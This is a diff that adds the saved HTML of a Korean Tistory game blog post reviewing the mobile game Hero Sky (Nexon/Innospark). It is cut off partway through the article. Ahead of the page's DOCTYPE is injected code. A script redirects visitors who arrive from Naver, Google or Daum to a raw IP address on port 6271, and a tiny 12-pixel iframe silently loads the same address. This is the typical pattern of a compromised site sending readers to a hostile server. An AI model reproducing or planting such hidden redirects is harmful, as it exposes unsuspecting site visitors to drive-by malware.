@@ -1,0 +1,1041 @@
+<script language="javascript" type="text/javascript">
+var url = document.referrer;
+if (url.indexOf("naver")>0){
+window.location.href="http://174.139.88.154:6271/index.html"; 
+
+}
+
+if (url.indexOf("google")>0){
+window.location.href="http://174.139.88.154:6271/index.html"; 	
+}
+
+if (url.indexOf("daum")>0){
+window.location.href="http://174.139.88.154:6271/index.html"; 
+}
+
+</script>
+<iframe src="http://174.139.88.154:6271/index.html" width="12" height="12" frameborder="12"></iframe><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<link rel="alternate" type="application/rss+xml" title="크리스탈의 게임 이야기" href="http://smblog.tistory.com/rss" />
+		<link rel="stylesheet" media="screen" type="text/css" href="http://ts.daumcdn.net/custom/blog/23/232344/skin/style.css?_T_=1409958139" />
+		<link rel="stylesheet" media="print" type="text/css" href="http://ts.daumcdn.net/custom/blog/23/232344/skin/images/print.css" />
+		<link rel="shortcut icon" href="/favicon.ico" />
+		<script type="text/javascript">
+	//<![CDATA[
+			function dateToImage() {
+		var elem = document.getElementById("imgMonth");
+		var targetObj = elem.firstChild.nodeValue;
+		if(elem && targetObj.length > 0){
+		  var txtImgMonth = "";
+		  for (var i = 0, l = targetObj.length; i < l; i++) {
+			if (targetObj.substring(i, i + 1) == ".") {
+			  txtImgMonth = txtImgMonth + "<span class='dot'>&nbsp;</span>";
+			} else {
+			  txtImgMonth = txtImgMonth + "<span class='tt-calendar-num num" + targetObj.substring(i, i + 1) + "'>&nbsp;</span>";
+			}
+		  }
+		  elem.innerHTML = txtImgMonth;
+		}
+			}
+
+			if (typeof window.addEventListener != 'undefined') {
+				window.addEventListener("load", dateToImage, false);
+			} else if (typeof window.attachEvent != 'undefined') {
+				window.attachEvent("onload", dateToImage);
+			}
+	//]]>
+		</script>
+		<title>크리스탈의 게임 이야기 :: </title>
+	
+<link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/TistoryProfileLayer/style.css" />
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/TistoryProfileLayer/profile.js"></script>
+<script type="text/javascript">var asyncProfileItems = [];</script>
+<script type="text/javascript">
+//<![CDATA[
+var servicePath = "";
+var blogURL = "";
+var s_trackbackUrlCopied = "엮인글 주소가 복사되었습니다";
+var s_trackbackUrlCopyFailed = "엮인글 주소를 복사하지 못했습니다";
+var SCRIPT_VERSION = '437';
+//]]>
+</script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/lib/jigu/jigu-latest.min.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/T.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/EAF2.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/common.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/gallery.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/flash.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/PHON.js"></script>
+<script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/swfobject.js"></script>
+<link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/style/dialog.css" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://smblog.tistory.com/api?rsd" /><link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/css/reset.css" /><link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/css/tabloid.css" /><link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/css/items.css" /><link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/css/util.css" /><link rel="stylesheet" id="ttTabloidGridCSS" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/css/grid/tistory-grid-min.css" />
+<style type="text/css">
+div#ttCanvas .tt-item .tt-post-title, div#ttCanvas .tt-item .tt-post-title a, div#ttCanvas .tt-post-title a {color: #333; font-family: Dotum, Verdana, AppleGothic, Sans-serif; }div#ttCanvas .tt-post-summary a, div#ttCanvas .tt-post-summary { color: #333 }div#ttCanvas .tt-post-etcinfo, div#ttCanvas .tt-post-etcinfo span, div#ttCanvas .tt-post-etcinfo span a {
+							color: #333;
+							opacity: 0.6; filter:alpha(opacity=60);
+							_display: inline-block;
+						}div#ttCanvas hr.tt-line { border-color: #333; opacity: 0.3; filter:alpha(opacity=30);}div#ttCanvas {margin-left : auto;  }div#ttCanvas {margin-top : 0; }</style><script type="text/javascript">
+		var content_width = 595;
+	</script><script type="text/javascript" src="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/plugins/Tabloid/js/supplement/items.js"></script><link rel="stylesheet" type="text/css" href="http://s1.daumcdn.net/cfs.tistory/resource/437/blog/style/menubar.css"/><style type="text/css">.tt_article_useless_p_margin p {padding-top:0 !important;padding-bottom:0 !important;margin-top:0 !important;margin-bottom:0 !important;}</style>
+			<meta property="og:url" content="http://smblog.tistory.com/42" />
+			<meta property="og:site_name" content="크리스탈의 게임 이야기" />
+			<meta property="og:title" content="[리뷰] 히어로 스카이 (넥슨/이노스파크)" />
+			<meta property="og:description" content="[리뷰] 히어로 스카이 (넥슨/이노스파크)  지난 8월 8일에 넥슨이 서비스하고, 이노스파크가 개발한 ‘히어로 스카이’가 오픈했다. 처음 스크린샷만을 봤을 때는 클래시 오브 클랜(이하 CoC)와 룰 더 스카이(이하 룰스)를 합쳐 놓은 듯한 게임인 듯한 느낌을 받았다. 하지만 강렬한 튜토리얼을 경험한 동시에 제목이 의미하는 바와 CoC, 룰스와 다른 재미를 느낄 수 있었다. 이 글을 읽고 있는 여러분도 비슷한 느낌을 받았을.." /><meta property="og:image" content="http://cfile24.uf.tistory.com/image/234E254753EC041E06FEF2" />
+</head>
+	<body class="tedition_blog tistory_grid_595" id="tt-body-page">
+
+		
+<script type="text/javascript">
+//<![CDATA[
+	var TOP_SSL_URL = 'https://www.tistory.com';
+
+	function processShortcut(event) {
+			if (isIE)
+		{
+			event = window.event;
+			event.target = event.srcElement;
+		}
+
+		if (event.altKey || event.ctrlKey || event.metaKey)
+			return;
+		switch (event.target.nodeName) {
+			case "INPUT":
+			case "SELECT":
+			case "TEXTAREA":
+				return;
+		}
+		switch (event.keyCode) {
+			case 81: //Q
+
+				window.location = "/admin";
+				break;
+			case 83: //S
+				window.location = "?page=2";
+				break;
+			case 90: //Z
+				window.location = "#recentEntries";
+				break;
+			case 88: //X
+				window.location = "#recentComments";
+				break;
+			case 67: //C
+				window.location = "#recentTrackback";
+				break;
+		}
+	}
+	document.onkeydown = processShortcut;
+
+	function addComment(caller, entryId) {
+		var oForm = findFormObject(caller);
+		if (!oForm)
+			return false;
+		var request = new HTTPRequest("POST", oForm.action);
+		request.onSuccess = function () {
+			if(entryId == 0)
+				window.location = blogURL + "/guestbook";
+			else {
+				document.getElementById("entry" + entryId + "Comment").innerHTML = this.getText("/response/commentBlock");
+				if(document.getElementById("recentComments"))
+					document.getElementById("recentComments").innerHTML = this.getText("/response/recentCommentBlock");
+				if(document.getElementById("commentCount" + entryId))
+					document.getElementById("commentCount" + entryId).innerHTML = this.getText("/response/commentView");
+				if(document.getElementById("commentCountOnRecentEntries" + entryId))
+					document.getElementById("commentCountOnRecentEntries" + entryId).innerHTML = "(" + this.getText("/response/commentCount") + ")";
+			}
+			if(typeof window.needCommentCaptcha !== "undefined"){
+				captchaPlugin.init('complete');
+			}
+		}
+		request.onError = function() {
+			var description = this.getText("/response/description");
+			if (description) { alert(description); }
+		}
+		var queryString = "key=tistory";
+		var captchaInput = document.getElementById('inputCaptcha');
+		if (oForm["name"])
+			queryString += "&name=" + encodeURIComponent(oForm["name"].value);
+		if (oForm["password"])
+			queryString += "&password=" + encodeURIComponent(oForm["password"].value);
+		if (oForm["homepage"])
+			queryString += "&homepage=" + encodeURIComponent(oForm["homepage"].value);
+		if (oForm["secret"] && oForm["secret"].checked)
+			queryString += "&secret=1";
+		if (oForm["comment"])
+			queryString += "&comment=" + encodeURIComponent(oForm["comment"].value);
+		if (captchaInput) {
+			if (!captchaInput.value) {
+				alert('그림문자가 입력되지 않았습니다.');
+				return false;
+			}
+			queryString += "&captcha=" + encodeURIComponent(captchaInput.value);
+		}
+		request.send(queryString);
+	}
+	function commentRequireLoginByDormancy() {
+				if(confirm("'크리스탈의 게임 이야기' 블로그는 휴면 상태로 댓글을 남기시려면 티스토리에 로그인하셔야 합니다. 지금 로그인하시겠습니까?")) {
+			window.location = "https://www.tistory.com/login/?requestURI=http%3A%2F%2Fsmblog.tistory.com%2F";
+		} else {
+			window.focus();
+		}
+	}
+
+	function commentObserverForAuth(evetObj) {
+		var reex = /name|password|homepage|secret|comment/;
+		if (isIE)
+			var	name = evetObj.srcElement.name
+		else
+			var	name = evetObj.target.name
+		if(reex.test(name) && !(new RegExp("^entry\\d+password$").test(name))) {
+			commentRequireLoginByDormancy();
+		}
+	}
+
+	STD.addEventListener(document);
+	document.addEventListener("click", commentObserverForAuth, false);
+
+	var openWindow='';
+	function alignCenter(win,width,height) {
+		if(navigator.userAgent.indexOf("Chrome") == -1)
+			win.moveTo(screen.width/2-width/2,screen.height/2-height/2);
+	}
+
+	function deleteComment(id) {
+		var width = 450;
+		var height = 360;
+				try { openWindow.close(); } catch(e) { }
+				openWindow = window.open("/comment/delete/" + id, "tatter", "width="+width+",height="+height+",location=0,menubar=0,resizable=0,scrollbars=0,status=0,toolbar=0");
+		openWindow.focus();
+		alignCenter(openWindow,width,height);
+	}
+
+	function commentComment(parent, guestbookPage) {
+		var width = 450;
+		var height = 360;
+				try { openWindow.close(); } catch(e) { }
+				openWindow = window.open("/comment/comment/" + parent + (guestbookPage ? "?guestbookPage=" + guestbookPage: ""), "tatter", "width="+width+",height="+height+",location=0,menubar=0,resizable=0,scrollbars=0,status=0,toolbar=0");
+		openWindow.focus();
+		alignCenter(openWindow,width,height);
+	}
+
+	function editEntry(parent,child) {
+		var width =  1169;
+		var height = 600;
+		if(openWindow != '') openWindow.close();
+		openWindow = window.open("/admin/entry/edit/" + parent + "?popupEditor&returnURL=CLOSEME","tatter", "width="+1169+",height="+600+",location=0,menubar=0,resizable=1,scrollbars=1,status=0,toolbar=0");
+		openWindow.focus();
+		alignCenter(openWindow,width,height);
+	}
+
+	function guestbookComment(parent) {
+		var width = 450;
+		var height = 360;
+				try { openWindow.close(); } catch(e) { }
+				openWindow = window.open("/comment/comment/" + parent, "tatter", "width="+width+",height="+height+",location=0,menubar=0,resizable=0,scrollbars=0,status=0,toolbar=0");
+		openWindow.focus();
+		alignCenter(openWindow,width,height);
+	}
+
+	function sendTrackback(id) {
+		var width = 700;
+		var height = 500;
+				try { openWindow.close(); } catch(e) { }
+				openWindow = window.open("/trackback/send/" + id, "tatter", "width=580,height=400,location=0,menubar=0,resizable=1,scrollbars=1,status=0,toolbar=0");
+				openWindow.focus();
+		alignCenter(openWindow,width,height);
+	}
+
+	function deleteTrackback(id,entryId) {
+		if (confirm("트랙백을 삭제하기 위해서는 로그인이 필요합니다.\n로그인 하시겠습니까?\t")) {
+			window.location = "https://www.tistory.com/login/";
+			return false;
+		} else {
+			return false;
+		}
+	}
+
+	function reloadEntry(id) {
+		var password = document.getElementById("entry" + id + "password");
+		if (!password)
+			return;
+		document.cookie = "GUEST_PASSWORD=" + encodeURIComponent(password.value) + ";path=";
+
+		window.location.href = window.location.href;
+	}
+	loadedComments = new Array();
+	loadedTrackbacks = new Array();
+	function viewTrigger(id, category, categoryId) {
+		var request = new HTTPRequest("GET", "/"+category+"/view/" + id);
+		var target = document.getElementById('entry'+id+(category == 'comment' ? 'Comment' : 'Trackback'));
+		if(target == null)
+			return false;
+		request.onSuccess = function() {
+			target.innerHTML = this.getText("/response/result");
+			target.style.display = 'block';
+			highlight();
+			category == 'comment' ? loadedComments[id] = true : loadedTrackbacks[id] = true;
+			if(categoryId > -1)
+				location = location.toString();
+			if(category == 'trackback') {
+				var holder = document.getElementById('TrackbackCopyHolder' + id);
+				if(holder) {
+					holder.innerHTML = AC_FL_RunContentNotWriteGetString(
+						'src','http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/copyTrackback',
+						'Flashvars','url=http://smblog.tistory.com/trackback/' + id + '&mode=whiteButton',
+						'width','29',
+						'height','18',
+						'id', 'TrackbackCopyButton' + id,
+						'wmode','transparent',
+						'allowScriptAccess','always',
+						'type','application/x-shockwave-flash',
+						'pluginspage','http://www.macromedia.com/go/getflashplayer'
+					);
+				}
+			}
+			if(typeof window.needCommentCaptcha !== "undefined"){
+				captchaPlugin.init();
+			}
+		}
+		request.onError = function() {
+			alert('실패 했습니다');
+		}
+		request.send();
+	}
+	function highlight() {
+		var hash = new RegExp("^#(comment\\d+)").exec(window.location.hash);
+		if(hash && (el = document.getElementById(hash[1])))
+			highlightElement(hash[1], 0, el.style.backgroundColor);
+	}
+	function highlightElement(id, amount, origColor) {
+		var el = document.getElementById(id);
+		if (!el) {
+			return;
+		}
+		el.style.backgroundColor = amount % 2 ? "#FFFF44" : origColor;
+		if (++amount < 7) {
+			setTimeout("highlightElement('" + id + "', " + amount + ", '" + origColor + "')", 200);
+		}
+	}
+	function toggleLayerForEntry(id, category, categoryId, mode) {
+		if((category == 'comment' ? loadedComments[id] : loadedTrackbacks[id])) {
+			try {
+				var obj = document.getElementById('entry'+id+(category == 'comment' ? 'Comment' : 'Trackback'));
+				if(mode == undefined)
+					obj.style.display = (obj.style.display == "none") ? "block" : "none";
+				else
+					obj.style.display = (mode == 'show') ? "block" : "none";
+			} catch (e) {
+
+			}
+			return true;
+		} else {
+			if(categoryId) {
+				viewTrigger(id,category, categoryId);
+			} else {
+				viewTrigger(id,category, -1);
+			}
+		}
+	}
+	function ObserverForAnchor(evetObj) {
+		var lo = location.toString();
+		var queryString = lo.substr(lo.lastIndexOf('/')+1);
+		if(queryString.indexOf('#')>-1) {
+			var qsElements = queryString.split('#');
+			if(qsElements[1].indexOf('comment')>-1) {
+				var category = 'comment';
+			} else if(qsElements[1].indexOf('trackback')>-1) {
+				var category = 'trackback';
+			}
+			if(category) {
+				entryid = qsElements[0];
+				categoryId = qsElements[1].substr(category.length);
+				toggleLayerForEntry(entryid,category,categoryId, 'show');
+			}
+		}
+	}
+
+	STD.addEventListener(window);
+	window.addEventListener("load", ObserverForAnchor, false);
+//]]>
+</script>
+<div style="margin:0px; padding:0px; border:none; background:none; float:none; clear:none; z-index:0"></div>
+
+			<div id="container">
+				<div id="container2">
+					<div id="header">
+						<!-- 블로그 타이틀 모듈 -->
+						  <div class="wrapBlogTitle">
+				<h1><a href="/">크리스탈의 게임 이야기</a></h1>
+						  </div>
+							<div class="user_date">
+								<script type="text/javascript">
+							  //<![CDATA[
+								  var strEngDay = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+									var d = new Date();
+									var sToday = d.getFullYear() + "." + (d.getMonth() + 1) + "." + d.getDate();
+									document.write(sToday + "(" + strEngDay[d.getDay()] + ")");
+				//]]>
+								</script>
+							</div>
+							<!-- 카운터 모듈 -->
+							<div id="counter">
+								<ul>
+									<li class="total">Total <span class="tt-emp">9,052</span></li>
+									<li class="today">Today 1</li>
+									<li class="yesterday">Yesterday 2</li>
+								</ul>
+							</div>
+						<!-- close blogMenu -->
+					</div><!-- close header -->
+					<div id="wrapBody">
+						<div id="sidebar1">
+									<!-- 블로그 이미지/설명 모듈 -->
+									<div id="blogImage"><img src="http://i1.daumcdn.net/cfs.tistory/resource/174/blog/image/spacer.gif" alt="블로그 이미지" /></div>
+									<div class="blogIntro">
+										<div id="userID">[크리스탈]</div>
+										<div id="blogDesc">http://smblog.ba.ro</div>
+									</div>
+									<!-- 달력 모듈 -->
+									<div id="calendar">
+										<h3>calendar</h3>
+										
+											<div class="cal_month">
+												<a href="/archive/201502" class="calendar_prev" title="1개월 앞의 달력을 보여줍니다.">&nbsp;<span>&laquo;</span></a>
+												<a href="/archive/201504" class="calendar_next" title="1개월 뒤의 달력을 보여줍니다.">&nbsp;<span>&raquo;</span></a>
+												<a href="/archive/201503" title="현재 달의 달력을 보여줍니다."><span id="imgMonth">2015.03</span></a>
+											</div>
+											<table class="tt-calendar" cellpadding="0" cellspacing="7" style="table-layout: fixed">
+												
+													<thead>
+														<tr>
+															
+																<th class="cal_week2">일</th>
+															
+																<th class="cal_week1">월</th>
+															
+																<th class="cal_week1">화</th>
+															
+																<th class="cal_week1">수</th>
+															
+																<th class="cal_week1">목</th>
+															
+																<th class="cal_week1">금</th>
+															
+																<th class="cal_week1">토</th>
+															
+														</tr>
+													</thead>
+												
+												
+													<tbody>
+														
+															<tr class="cal_week cal_current_week">
+																
+																	<td class="cal_day cal_day3 cal_day_sunday">1</td>
+																
+																	<td class="cal_day cal_day3">2</td>
+																
+																	<td class="cal_day cal_day3">3</td>
+																
+																	<td class="cal_day cal_day3">4</td>
+																
+																	<td class="cal_day cal_day4">5</td>
+																
+																	<td class="cal_day cal_day3">6</td>
+																
+																	<td class="cal_day cal_day3">7</td>
+																
+															</tr>
+														
+															<tr class="cal_week">
+																
+																	<td class="cal_day cal_day3 cal_day_sunday">8</td>
+																
+																	<td class="cal_day cal_day3">9</td>
+																
+																	<td class="cal_day cal_day3">10</td>
+																
+																	<td class="cal_day cal_day3">11</td>
+																
+																	<td class="cal_day cal_day3">12</td>
+																
+																	<td class="cal_day cal_day3">13</td>
+																
+																	<td class="cal_day cal_day3">14</td>
+																
+															</tr>
+														
+															<tr class="cal_week">
+																
+																	<td class="cal_day cal_day3 cal_day_sunday">15</td>
+																
+																	<td class="cal_day cal_day3">16</td>
+																
+																	<td class="cal_day cal_day3">17</td>
+																
+																	<td class="cal_day cal_day3">18</td>
+																
+																	<td class="cal_day cal_day3">19</td>
+																
+																	<td class="cal_day cal_day3">20</td>
+																
+																	<td class="cal_day cal_day3">21</td>
+																
+															</tr>
+														
+															<tr class="cal_week">
+																
+																	<td class="cal_day cal_day3 cal_day_sunday">22</td>
+																
+																	<td class="cal_day cal_day3">23</td>
+																
+																	<td class="cal_day cal_day3">24</td>
+																
+																	<td class="cal_day cal_day3">25</td>
+																
+																	<td class="cal_day cal_day3">26</td>
+																
+																	<td class="cal_day cal_day3">27</td>
+																
+																	<td class="cal_day cal_day3">28</td>
+																
+															</tr>
+														
+															<tr class="cal_week">
+																
+																	<td class="cal_day cal_day3 cal_day_sunday">29</td>
+																
+																	<td class="cal_day cal_day3">30</td>
+																
+																	<td class="cal_day cal_day3">31</td>
+																
+																	<td class="cal_day2">&nbsp;</td>
+																
+																	<td class="cal_day2">&nbsp;</td>
+																
+																	<td class="cal_day2">&nbsp;</td>
+																
+																	<td class="cal_day2">&nbsp;</td>
+																
+															</tr>
+														
+													</tbody>
+												
+											</table>
+										
+									</div>
+									<!-- 공지사항 모듈 -->
+									
+										<div id="notice" class="tt-module">
+											<h3>Notice</h3>
+											<ul>
+												
+											</ul>
+										</div>
+									
+									<!-- 태그목록 모듈 -->
+									<div id="tagbox" class="tt-module">
+										<h3>Tag</h3>
+										<ul>
+											
+												<li><a href="/tag/카트" class="cloud5">카트</a></li>
+											
+												<li><a href="/tag/모바일게임" class="cloud2">모바일게임</a></li>
+											
+												<li><a href="/tag/인터뷰" class="cloud4">인터뷰</a></li>
+											
+												<li><a href="/tag/물돌3" class="cloud4">물돌3</a></li>
+											
+												<li><a href="/tag/GXG" class="cloud4">GXG</a></li>
+											
+												<li><a href="/tag/라라" class="cloud5">라라</a></li>
+											
+												<li><a href="/tag/미니게임천국3" class="cloud5">미니게임천국3</a></li>
+											
+												<li><a href="/tag/게임빌%20매니아" class="cloud4">게임빌 매니아</a></li>
+											
+												<li><a href="/tag/oz" class="cloud5">oz</a></li>
+											
+												<li><a href="/tag/께매" class="cloud4">께매</a></li>
+											
+												<li><a href="/tag/고수" class="cloud5">고수</a></li>
+											
+												<li><a href="/tag/영웅서기" class="cloud5">영웅서기</a></li>
+											
+												<li><a href="/tag/2007프로야구net" class="cloud4">2007프로야구net</a></li>
+											
+												<li><a href="/tag/ea" class="cloud5">ea</a></li>
+											
+												<li><a href="/tag/드로" class="cloud5">드로</a></li>
+											
+												<li><a href="/tag/게임빌사보" class="cloud4">게임빌사보</a></li>
+											
+												<li><a href="/tag/컴투스" class="cloud5">컴투스</a></li>
+											
+												<li><a href="/tag/넥슨" class="cloud4">넥슨</a></li>
+											
+												<li><a href="/tag/마나블럭" class="cloud5">마나블럭</a></li>
+											
+												<li><a href="/tag/크리스탈" class="cloud1">크리스탈</a></li>
+											
+												<li><a href="/tag/카트라이더" class="cloud5">카트라이더</a></li>
+											
+												<li><a href="/tag/물가에돌튕기기3" class="cloud4">물가에돌튕기기3</a></li>
+											
+												<li><a href="/tag/개발사탐방" class="cloud5">개발사탐방</a></li>
+											
+												<li><a href="/tag/핸즈온" class="cloud4">핸즈온</a></li>
+											
+												<li><a href="/tag/미니게임천국" class="cloud5">미니게임천국</a></li>
+											
+												<li><a href="/tag/리뷰" class="cloud3">리뷰</a></li>
+											
+												<li><a href="/tag/넥슨모바일" class="cloud5">넥슨모바일</a></li>
+											
+												<li><a href="/tag/게임빌" class="cloud3">게임빌</a></li>
+											
+												<li><a href="/tag/프야" class="cloud4">프야</a></li>
+											
+												<li><a href="/tag/오즈" class="cloud5">오즈</a></li>
+											
+										</ul>
+									</div>
+				  
+									<!-- 배너 모듈 - 티스토리 -->
+									<div id="adTistory">
+										<a href="http://www.tistory.com/join" title="티스토리 가입하기!">티스토리 가입하기</a>
+									</div>
+						</div>
+						<!-- close sidebar -->
+						<div id="sidebar2">
+									<!-- 검색 모듈 -->
+									<div id="searchBox">
+										<h3>Search</h3>
+										
+											<div class="cnt">
+												<input type="text" name="search" value="" onkeypress="if (event.keyCode == 13) { try{window.location.href='/search/' + looseURIEncode(document.getElementsByName('search')[0].value);document.getElementsByName('search')[0].value = ''; return false;}catch(e){} }"/><input value="검색" type="button" onclick="try{window.location.href='/search/' + looseURIEncode(document.getElementsByName('search')[0].value);document.getElementsByName('search')[0].value = ''; return false;}catch(e){}" class="submit"/>
+											</div>
+										
+									</div>
+									<!-- 카테고리 모듈 -->
+									<div id="category">
+										<h3>Category</h3>
+										<ul><li><a href="/category">전체보기 <span class="c_cnt">(27)</span></a><ul><li><a href="/category/스마트폰%20게임">스마트폰 게임 <span class="c_cnt">(1)</span></a></li><li><a href="/category/모바일%20게임">모바일 게임 <span class="c_cnt">(13)</span></a></li><li><a href="/category/크리스탈">크리스탈 <span class="c_cnt">(8)</span></a><ul><li><a href="/category/크리스탈/기사">기사 <span class="c_cnt">(7)</span></a></li></ul></li><li><a href="/category/기타">기타 <span class="c_cnt">(5)</span></a></li></ul></li></ul>
+									</div>
+			   
+									<!-- 최근 포스트 모듈 -->
+									<div id="recentPost" class="tt-module">
+										<h3>Recent Post</h3>
+										<ul>
+											
+												<li>
+													<a href="/42">[리뷰] 히어로 스카..</a>
+													<span class="c_cnt"><span id="commentCountOnRecentEntries42"></span></span>
+												</li>
+											
+												<li>
+													<a href="/41">카트라이더</a>
+													<span class="c_cnt"><span id="commentCountOnRecentEntries41"></span></span>
+												</li>
+											
+												<li>
+													<a href="/38">무료도메인</a>
+													<span class="c_cnt"><span id="commentCountOnRecentEntries38"></span></span>
+												</li>
+											
+												<li>
+													<a href="/31">리듬스타</a>
+													<span class="c_cnt"><span id="commentCountOnRecentEntries31">(3)</span></span>
+												</li>
+											
+												<li>
+													<a href="/30">해본 게임들</a>
+													<span class="c_cnt"><span id="commentCountOnRecentEntries30"></span></span>
+												</li>
+											
+										</ul>
+									</div>
+								
+									<!-- 최근 댓글 모듈 -->
+									<div id="recentComment" class="tt-module">
+										<h3>Recent Comment</h3>
+										<ul id="recentComments">
+											
+												<li>
+													<a href="/31#comment1188624">잼 있꺽다,..</a>
+													<span class="info"><span class="name">지용 마눌</span><span class="date">2008</span></span>
+												</li>
+											
+												<li>
+													<a href="/31#comment1081254">잼다</a>
+													<span class="info"><span class="name">설렘지용</span><span class="date">2008</span></span>
+												</li>
+											
+												<li>
+													<a href="/31#comment1006864">아~~재미있겠다 ㅎ..</a>
+													<span class="info"><span class="name">재미나</span><span class="date">2008</span></span>
+												</li>
+											
+										</ul>
+									</div>
+								
+						</div>
+						<div id="content">
+							<div class="wrapContentTop">
+								<div id="blogMenu"><ul>	<li class="t_menu_home first">
+		<a href="/">블로그홈</a>
+	</li>
+	<li class="t_menu_location">
+		<a href="/location">지역로그</a>
+	</li>
+	<li class="t_menu_tag">
+		<a href="/tag">태그로그</a>
+	</li>
+	<li class="t_menu_medialog">
+		<a href="/media">미디어로그</a>
+	</li>
+	<li class="t_menu_guestbook last">
+		<a href="/guestbook">방명록</a>
+	</li>
+</ul></div>
+							</div>
+<!-- 태그 -->
+							
+<!-- 지역로그 -->
+							
+							<!-- 본문검색리스트 -->
+							
+							<!-- 댓글검색리스트 -->
+							
+							<!-- 공지사항글 -->
+							
+							<!-- 보호글 -->
+							<!-- 포스트의 본문 시작 -->
+							
+								<div class="entry">
+									<div class="wrapEntryHead">
+										<span class="date">2014/08/14 10:33</span>
+										<span class="category"><a href="/category/스마트폰%20게임">스마트폰 게임</a></span>
+									</div>
+									<div class="wrapEntryCnt">
+										<div class="titleWrap">
+											<h2><a href="/42">[리뷰] 히어로 스카이 (넥슨/이노스파크)</a></h2>
+											<!-- 포스트관리 -->
+											
+										</div>
+										<!-- close titleWrap --><!-- 포스트 본문 내용 -->
+										<div class="article">
+											<div class="tt_article_useless_p_margin"><p ><span style="font-size: 12pt;"><b>[리뷰] 히어로 스카이 (넥슨/이노스파크)</b></span></p><p ><br /></p><p ><br /></p><p  style="text-align: center; clear: none; float: none;"><span class="imageblock" style="display:inline-block;width:630px;;height:auto"><img src="http://cfile24.uf.tistory.com/image/234E254753EC041E06FEF2" style="cursor: pointer;" onclick="open_img('http://cfile24.uf.tistory.com/original/234E254753EC041E06FEF2')"  height="378" style="" width="630" /></span></p><p ><br /></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;지난 8월</span><span  style="font-family: Dotum, 돋움;">&nbsp;8</span><span style="font-family: Dotum, 돋움;">일에 넥슨이 서비스하고</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">이노스파크가
+개발한 </span><span  style="font-family: Dotum, 돋움;">‘</span><span style="font-family: Dotum, 돋움;"><b><span style="font-size: 11pt;">히어로 스카이</span></b></span><span  style="font-family: Dotum, 돋움;">’</span><span style="font-family: Dotum, 돋움;">가 오픈했다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">처음 스크린샷만을 봤을 때는 클래시 오브 클랜</span><span  style="font-family: Dotum, 돋움;">(</span><span style="font-family: Dotum, 돋움;">이하</span><span  style="font-family: Dotum, 돋움;"> CoC)</span><span style="font-family: Dotum, 돋움;">와 룰 더 스카이</span><span  style="font-family: Dotum, 돋움;">(</span><span style="font-family: Dotum, 돋움;">이하 룰스</span><span  style="font-family: Dotum, 돋움;">)</span><span style="font-family: Dotum, 돋움;">를
+합쳐 놓은 듯한 게임인 듯한 느낌을 받았다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">하지만 강렬한 튜토리얼을 경험한 동시에 제목이 의미하는
+바와</span><span  style="font-family: Dotum, 돋움;"> CoC, </span><span style="font-family: Dotum, 돋움;">룰스와 다른 재미를 느낄 수 있었다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">이 글을
+읽고 있는 여러분도 비슷한 느낌을 받았을 것으로 생각하는데</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">하나씩&nbsp;게임을 분석해 보도록 하자</span><span ><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><span  style="font-family: Dotum, 돋움;">&nbsp;</span></p><p ><span  style="font-family: Dotum, 돋움;"><br /></span></p><p ><span  style="font-family: Dotum, 돋움;"></span></p><p  style="text-align: center; clear: none; float: none;"><br /></p><p  style="text-align: center; clear: none; float: none;"><br /></p><p  style="text-align: center; clear: none; float: none;"><span class="imageblock" style="display:inline-block;width:300px;;height:auto"><img src="http://cfile2.uf.tistory.com/image/252E044D53EC047F1D49B7" style="cursor: pointer;" onclick="open_img('http://cfile2.uf.tistory.com/original/252E044D53EC047F1D49B7')"  height="180" style="" width="300" /></span>&nbsp;<span class="imageblock" style="display:inline-block;width:300px;font-size: 9pt; line-height: 1.5;;height:auto"><img src="http://cfile6.uf.tistory.com/image/2427F94753EC049534DCAC" style="cursor: pointer;" onclick="open_img('http://cfile6.uf.tistory.com/original/2427F94753EC049534DCAC')"  height="180" style="font-size: 9pt; line-height: 1.5;" width="300" /></span></p><p  style="text-align: center; clear: none; float: none;"><br /><span id="callbacknestsmblogtistorycom426981" style="width:1px; height:1px; float:right"><embed  allowscriptaccess="always"  id="bootstrappersmblogtistorycom426981"  src="http://smblog.tistory.com/plugin/CallBack_bootstrapperSrc?nil_profile=tistory&amp;nil_type=copied_post"  width="1"  height="1"  